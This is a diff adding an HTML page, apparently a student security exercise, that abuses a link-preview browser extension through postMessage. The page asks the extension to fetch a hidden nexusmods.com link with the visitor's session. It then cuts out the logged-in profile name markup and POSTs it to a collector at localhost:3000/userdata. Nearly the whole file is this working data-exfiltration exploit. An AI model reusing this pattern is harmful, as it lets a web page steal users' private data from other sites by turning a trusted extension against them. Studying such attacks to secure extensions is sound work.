@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Don't worry about it :)</title>
+  </head>
+  <body>
+    <div style="border:1px solid black;">
+      <a style="margin-right:10px" href="https://www.kth.se/">School</a>
+      <a style="margin-right:10px" href="https://www.youtube.com/">Vidoes</a>
+      <a id="checkOut" style="margin-right:10px" href="https://github.com/">Coding</a>
+      </div> 
+    <div style="border:1px solid black;">
+      <a id="profit" href="https://www.nexusmods.com/"></a>
+    </div> 
+  </body>
+  <script>
+    let ownAddress = "http://localhost:3000"
+    ownAddress += "/userdata"
+    addEventListener("message", function(event){
+      if (event.data.linkPreview == "init") {
+        console.log("Webapp saw init")
+        postMessage({inspectList:["profit", "checkOut"]}, "*");
+      }
+      else if (event.data.previewContent) {
+        let receivedContent = event.data.previewContent;
+        let id = event.data.id
+        console.log("Webapp received ID: ")
+        console.log(id)
+        //console.log("and webapp received content: ")
+        //console.log(receivedContent)
+        // https://www.codegrepper.com/code-examples/javascript/pass+body+in+post+request+javascript
+        if (id == "profit") {
+          let searchString = '<div class="profile-name-wrapper">'
+          let index = String(receivedContent).indexOf(searchString)
+          let payload = index === -1 ? "Not logged in" : String(receivedContent).substring(index, index + 200)
+          fetch(ownAddress, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({data: payload}),
+          })
+        }
+        else if (id == "checkOut") {
+          postMessage({"addPreviewList": ["checkOut"]}, "*");
+        }
+      }
+    });
+  </script>
+</html>
